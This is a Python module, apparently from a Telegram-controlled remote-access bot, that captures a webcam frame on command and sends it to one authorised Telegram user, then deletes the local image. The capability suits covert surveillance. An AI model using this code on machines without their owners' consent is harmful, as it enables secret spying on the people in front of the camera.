##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


import os
import cv2
from aiogram import types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from lib.texts import TEXTS, user_languages

from config import ALLOWED_USER_ID, directory

def register_snapshot_handlers(dp):
    @dp.message(F.text.lower().in_({"фото с камеры", "webcam photo"}))
    @dp.message(Command("snapshot"))
    async def send_photo(message: types.Message):
        user_id = message.from_user.id
        lang = 'ru' if message.text.lower() == "фото с камеры" else user_languages.get(user_id, 'en')
        texts = TEXTS[lang]

        if user_id == ALLOWED_USER_ID:
            await message.answer(texts["snapshot_start"])
            filename = "snapshot.png"
            filepath = os.path.join(directory, filename)

            try:
                camera = cv2.VideoCapture(0)
                if not camera.isOpened():
                    raise RuntimeError(texts["camera_open_error"])

                ret, frame = camera.read()
                if not ret:
                    raise RuntimeError(texts["snapshot_error"])

                cv2.imwrite(filepath, frame)
                photo = FSInputFile(filepath)
                await message.answer_photo(photo, caption=texts["snapshot_sent"])

            except Exception as e:
                await message.answer(texts["snapshot_exception"].format(error=e))

            if 'camera' in locals() and camera.isOpened():
                camera.release()

            if os.path.exists(filepath):
                os.remove(filepath)

        else:
            await message.answer(texts["no_access"])